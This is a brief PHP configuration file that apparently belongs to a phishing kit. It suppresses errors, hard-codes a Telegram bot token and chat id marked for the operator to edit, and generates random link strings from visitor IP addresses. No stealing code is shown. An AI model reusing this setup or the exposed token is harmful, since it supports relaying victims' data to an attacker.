<?php

error_reporting(0);


$telegrambot='1515575447:AAFxvYAqurA4DgwM4nJjpWDYeKI64_GKOx4';// Edit Your Telegram Bot
$telegramchatid=1016625404;// Edit Your Telegram Chat id


// For Random on links
$random    = rand(0,100000).$_SERVER['REMOTE_ADDR'];
$random1    = substr(md5($random), 0, 20);
$random2 = substr(md5($random), 0, 14);



?>